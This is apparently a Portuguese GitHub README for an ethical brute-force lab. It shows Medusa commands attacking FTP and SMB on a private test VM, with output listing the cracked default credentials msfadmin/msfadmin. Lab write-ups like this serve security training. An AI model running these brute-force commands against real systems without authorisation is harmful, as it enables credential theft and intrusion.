# Medusa
Laboratório de testes éticos de força bruta com Medusa, demonstrando como ferramentas de segurança podem ser usadas para validar credenciais em ambientes controlados.
-------------------------------------------------------------------------------------------------


Laboratório de testes éticos de força bruta com Medusa, demonstrando como ferramentas de segurança podem ser usadas para validar credenciais em ambientes controlados.

# 🔐 Brute Force Lab com Medusa

Este projeto demonstra o uso ético e controlado da ferramenta **Medusa** para testes de força bruta em serviços como **FTP** e **SMB**, dentro de um ambiente de laboratório (máquina virtual e rede privada).

---

## ⚙️ Ferramentas utilizadas

- **Kali Linux**
- **Medusa v2.3**
- **Serviços testados:** FTP, SMB (Samba)
- **Host alvo:** 192.168.1.3 (máquina local de teste)
- **Wordlists:** listas simples de usuários e senhas (`userex.txt`, `senhaex.txt`)

---

## 🧩 Exemplos de execução

### Teste FTP

sudo medusa -h 192.168.1.3 -U userex.txt -P senhaex.txt -M ftp -t 5 -f

Host: 192.168.1.3 User: msfadmin Password: msfadmin [SUCCESS]


-------------------------------------------------------------------------------------------------
### Teste SMB

medusa -h 192.168.1.3 -U userex.txt -P senhaex.txt -M smbnt -t 4 -f

Host: 192.168.1.3 User: msfadmin Password: msfadmin [SUCCESS]


-------------------------------------------------------------------------------------------------
